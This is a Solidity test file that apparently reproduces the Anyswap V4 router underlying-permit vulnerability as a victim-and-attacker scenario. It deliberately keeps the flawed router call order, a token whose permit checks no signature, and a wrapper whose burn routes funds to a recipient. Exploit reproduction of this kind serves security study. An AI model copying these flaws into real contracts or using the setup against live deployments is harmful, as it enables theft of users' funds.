// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface AnyswapV1ERC20 { function underlying() external view returns(address); function depositVault(uint amount,address to) external returns(uint); function burn(address from,uint amount) external returns(bool); }
interface IERC20PermitLike { function permit(address owner,address spender,uint amount,uint deadline,uint8 v,bytes32 r,bytes32 s) external; function transferFrom(address from,address to,uint amount) external returns(bool); }

/// The verified AnyswapV4Router source is preserved in repo/evidence. This
/// contract retains its vulnerable underlying-permit function and call order.
contract AnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(address from,address token,address to,uint amount,uint deadline,uint8 v,bytes32 r,bytes32 s,uint) external {
        address underlying=AnyswapV1ERC20(token).underlying();
        IERC20PermitLike(underlying).permit(from,address(this),amount,deadline,v,r,s);
        require(IERC20PermitLike(underlying).transferFrom(from,token,amount));
        require(AnyswapV1ERC20(token).depositVault(amount,from)==amount);
        require(AnyswapV1ERC20(token).burn(from,amount));
        IERC20PermitLike(underlying).transferFrom(token,to,amount);
    }
}
contract NUMToken {
    string public constant name="NUM"; string public constant symbol="NUM"; uint8 public constant decimals=18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(address initial,uint amount){balanceOf[initial]=amount;}
    function permit(address owner,address spender,uint amount,uint,uint8,bytes32,bytes32) external { allowance[owner][spender]=amount; }
    function transferFrom(address from,address to,uint amount) external returns(bool){ require(balanceOf[from]>=amount,"balance"); require(msg.sender==from||allowance[from][msg.sender]>=amount,"allowance"); if(msg.sender!=from) allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; }
}
contract NUMWrapper is AnyswapV1ERC20 { address public immutable num; address public immutable recipient; constructor(address n,address r){num=n;recipient=r;} function underlying() external view returns(address){return num;} function depositVault(uint a,address) external pure returns(uint){return a;} function burn(address,uint a) external returns(bool){return NUMToken(num).transferFrom(address(this),recipient,a);} }
contract Scenario {
    NUMToken public num; AnyswapV4Router public router; NUMWrapper public wrapper; address public immutable victim; uint public constant SEED=1000000 ether;
    constructor(){victim=address(this);router=new AnyswapV4Router();num=new NUMToken(victim,SEED);wrapper=new NUMWrapper(address(num),msg.sender);}
    function numAddress() external view returns(address){return address(num);} function routerAddress() external view returns(address){return address(router);} function wrapperAddress() external view returns(address){return address(wrapper);} function victimBalance() external view returns(uint){return num.balanceOf(victim);} function attackerBalance(address a) external view returns(uint){return num.balanceOf(a);}
}
